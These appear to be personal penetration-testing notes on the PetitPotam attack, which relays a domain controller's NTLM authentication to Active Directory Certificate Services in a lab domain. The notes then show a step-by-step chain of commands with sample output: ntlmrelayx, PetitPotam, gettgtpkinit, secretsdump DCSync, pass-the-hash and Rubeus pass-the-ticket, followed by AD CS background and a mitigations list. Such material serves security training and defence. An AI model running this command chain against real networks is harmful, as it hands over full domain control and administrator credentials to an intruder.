## this exploits active directory with AD CS servers
you also need to figure out the server and path for cert enrolllment
use `nmap --script=http-enum`
## how this attack works:
- **Coerce the DC to authenticate to your attacker-controlled host** (PetitPotam’s job).
- **Intercept that NTLM authentication**.
- **Relay it** to an AD CS HTTP endpoint that allows **NTLM authentication** (usually `http://<CA_Server>/certsrv/certsrv/`).
- Request a **certificate** for the DC’s machine account.
- Convert that certificate to a **Kerberos TGT** using tools like Rubeus.
- You now have **full domain compromise** without touching the DC directly.

## Testing  For petitpotam

1. get the ceriticate enrollment endpoint


2. listen with relayx and point to the ceritifcate server
`ntlmrelayx listen and relay to cert enrollment interface`
```shell-session
$ sudo ntlmrelayx.py -debug -smb2support --target http://CA01.blackwood.local/certsrv/certfnsh.asp --adcs --template DomainController
```

`run petitpotam`
```shell-session
$ python3 PetitPotam.py <attacker-ip> <dc-ip>
```

`ntlmrelayx`
```
[*] GOT CERTIFICATE!
[*] Base64 certificate of user DC01$: 
MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiM6hMSUwIwYJKoZIhvcNAQkVMRYEFLqyF797X2SL//FR1NM+UQsli2GgMC0wITAJBgUrDgMCGgUABBQ84uiZwm1Pz70+e0p2GZNVZDXlrwQIyr7YCKBdGmY=
[*] Skipping user DC01$ since attack was already performed

<SNIP>
```


## abusing further to DCSYNC
#### using the obtain certificate to forge a kerberos TGT ticket
use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.
```shell-session
$ python3 gettgtpkinit.py blackwood.local/DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
#### Setting the KRB5CCNAME Environment Variable
The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the `KRB5CCNAME `environment variable, so our attack host uses this file for Kerberos authentication attempts

```shell-session
$ export KRB5CCNAME=dc01.ccache
```

```shell-session
$ klist

Ticket cache: FILE:dc01.ccache
Default principal: DC01$@blackwood.local

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/blackwood.local@blackwood.local
```

From here,  either DCSync or target DC01 directly to get admin NT hash 
We can also take an alternate route once we have the TGT for our target.

### **How Certificates are Issued in AD CS**

AD CS is a Windows Server role that allows organizations to issue and manage digital certificates. These certificates are used for authentication, encryption, and signing. Here's a high-level overview of how certificate enrollment and issuance work:

#### 1. **Certificate Templates**

- AD CS uses **certificate templates** to define the properties of certificates that can be issued.
    
- Templates specify things like:
    
    - Who can request the certificate (e.g., users, computers).
        
    - The intended purpose of the certificate (e.g., client authentication, code signing).
        
    - The cryptographic settings (e.g., key length, validity period).
        

#### 2. **Certificate Enrollment**

- A client (e.g., a user or computer) requests a certificate from the AD CS Certificate Authority (CA).
    
- The enrollment process typically involves:
    
    - **Generating a Key Pair**: The client generates a public/private key pair.
        
    - **Creating a Certificate Signing Request (CSR)**: The client creates a CSR, which includes the public key and information about the requester (e.g., subject name).
        
    - **Submitting the CSR**: The client sends the CSR to the CA.
        

#### 3. **Certificate Request Validation**

- The CA validates the request based on the certificate template and the requester's permissions.
    
- If the request is approved, the CA issues a certificate.
    

#### 4. **Certificate Issuance**

- The CA signs the certificate using its private key and sends it back to the client.
    
- The client installs the certificate and can now use it for authentication, encryption, or signing.

========================== THIS IS THE MOST IMPORTANT PART============
## Explaining the attack:

PetitPotam itself does not directly interact with AD CS to request certificates. Instead, it exploits the **NTLM relay attack** to force a domain controller (DC) or other systems to authenticate to an attacker-controlled server. The attacker can then relay this authentication to AD CS to request a certificate on behalf of the victim.

#### **Relaying to AD CS**

- The attacker relays the captured NTLM authentication to the AD CS web enrollment interface or other certificate enrollment endpoints.
    
- If the target system has permissions to request certificates (e.g., a domain controller), the attacker can request a certificate on its behalf.
    

#### 4. **Requesting a Certificate**

- The attacker uses the relayed authentication to submit a certificate request to AD CS.
    
- If the request is approved, the CA issues a certificate to the attacker.
    

#### 5. **Using the Certificate**

- The attacker can now use the issued certificate for malicious purposes, such as:
    
    - Authenticating to domain resources as the victim.
        
    - Performing **Kerberos delegation attacks** (e.g., S4U2Self or S4U2Proxy).
        
    - Escalating privileges within the domain.
- 
========================== THIS IS THE MOST IMPORTANT PART============



#### 1. **Check for AD CS and MS-EFSRPC Exposure**

- PetitPotam primarily targets systems with AD CS enabled or systems that expose the MS-EFSRPC protocol.
    
- Verify if your domain controllers or other systems are running AD CS or have the MS-EFSRPC interface exposed.

#### 2. **Check for NTLM Relay Vulnerabilities**

- PetitPotam relies on NTLM relay attacks. If NTLM authentication is enabled and not properly secured, your environment may be vulnerable.
    
- Check if **SMB signing** is enforced on all systems (especially domain controllers). If not, NTLM relay attacks are possible.
- [This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

=============================================================

# Performing the Attack

============================================================
## Method 1

`DcSync with the TGT`
```shell-session
$ secretsdump.py -just-dc-user BLACKWOOD/administrator -k -no-pass "DC01$"@DC01.blackwood.local
# output: <ADMIN NTLM HASH>
```

`use retrieved nt hash to confirm aceess`
```
$ nxc smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```
### Method 2
https://packages.ubuntu.com/focal/krb5-user
We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.
`get DC01 NT hash` 
```shell-session
$ python getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 blackwood.local/DC01$
```

`secretsdump dcsync`
```shell-session
$ secretsdump.py -just-dc-user BLACKWOOD/administrator "DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

`Requesting TGT and Performing PTT with DC01$ Machine Account`
```powershell-session
PS C:\Tools> .\Rubeus.exe asktgt /user:DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```
================================================================
### **Mitigations**

- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use
- 
To protect against PetitPotam and similar attacks involving AD CS:

1. **Patch Your Systems**:
    
    - Apply the latest security updates from Microsoft to address the PetitPotam vulnerability.
        
2. **Disable NTLM Authentication**:
    
    - Use Group Policy to disable NTLM and enforce Kerberos authentication.
        
3. **Enable SMB Signing**:
    
    - Ensure SMB signing is enabled on all systems to prevent NTLM relay attacks.
        
4. **Secure AD CS**:
    
    - Restrict access to certificate templates and enrollment endpoints.
        
    - Use **Certificate Manager Approval** to require manual approval for sensitive certificate requests.
        
5. **Monitor for Suspicious Activity**:
    
    - Regularly review logs for unusual certificate requests or authentication attempts.
        
6. **Implement Network Segmentation**:
    
    - Limit access to AD CS servers and domain controllers to trusted systems only.